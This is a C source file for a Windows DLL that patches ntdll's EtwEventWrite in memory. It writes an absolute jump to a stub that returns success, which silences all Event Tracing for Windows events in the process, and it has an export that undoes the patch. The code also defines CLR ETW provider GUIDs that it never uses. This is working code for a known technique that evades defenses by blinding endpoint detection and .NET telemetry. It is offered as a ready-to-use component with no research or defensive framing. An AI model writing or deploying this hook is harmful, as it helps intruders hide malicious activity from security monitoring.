#include <windows.h>
#include <evntprov.h>
#include <stdint.h>

#pragma comment(lib, "ntdll.lib")

// CLR ETW provider GUIDs
static const GUID ClrRuntimeProvider = { 0xe13c0d23, 0xccbc, 0x4e12, { 0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4 } };
static const GUID ClrRundownProvider = { 0xa669021c, 0xc450, 0x4609, { 0xa0, 0x35, 0x5a, 0xf5, 0x9a, 0xf4, 0xdf, 0x18 } };

static uintptr_t g_OriginalEtwEventWrite = 0;
static uintptr_t g_FilterEtwEventWrite = 0;
static uint8_t g_OriginalBytes[14] = { 0 };
static int32_t g_HooksInstalled = 0;

// Function pointer type for EtwEventWrite
typedef NTSTATUS(WINAPI* EtwEventWriteFunc)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
    );

// Our filter function - just returns 0 (success) to suppress all events
static NTSTATUS WINAPI FilterEtwEventWrite(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData)
{
    // Suppress all ETW events
    return 0;
}

static void WriteJump(uintptr_t from, uintptr_t to)
{
    // x64: use absolute indirect jump
    // JMP [RIP+0] then 8 bytes of target address
    uint8_t jmp[] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // target address
    };
    *(uintptr_t*)(jmp + 6) = to;
    memcpy((void*)from, jmp, sizeof(jmp));
}

__declspec(dllexport) int32_t InstallEtwHook(void)
{
    if (g_HooksInstalled) return 1;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return -1;

    uintptr_t etwFunc = (uintptr_t)GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwFunc) return -2;

    g_OriginalEtwEventWrite = etwFunc;

    // Save original bytes
    memcpy(g_OriginalBytes, (void*)etwFunc, 14);

    // Make writable
    DWORD oldProtect;
    if (!VirtualProtect((void*)etwFunc, 14, PAGE_EXECUTE_READWRITE, &oldProtect))
        return -3;

    g_FilterEtwEventWrite = (uintptr_t)&FilterEtwEventWrite;
    WriteJump(etwFunc, g_FilterEtwEventWrite);

    VirtualProtect((void*)etwFunc, 14, oldProtect, &oldProtect);

    g_HooksInstalled = 1;
    return 0;
}

__declspec(dllexport) int32_t UninstallEtwHook(void)
{
    if (!g_HooksInstalled) return 0;

    DWORD oldProtect;
    VirtualProtect((void*)g_OriginalEtwEventWrite, 14, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy((void*)g_OriginalEtwEventWrite, g_OriginalBytes, 14);
    VirtualProtect((void*)g_OriginalEtwEventWrite, 14, oldProtect, &oldProtect);

    g_HooksInstalled = 0;
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    return TRUE;
}
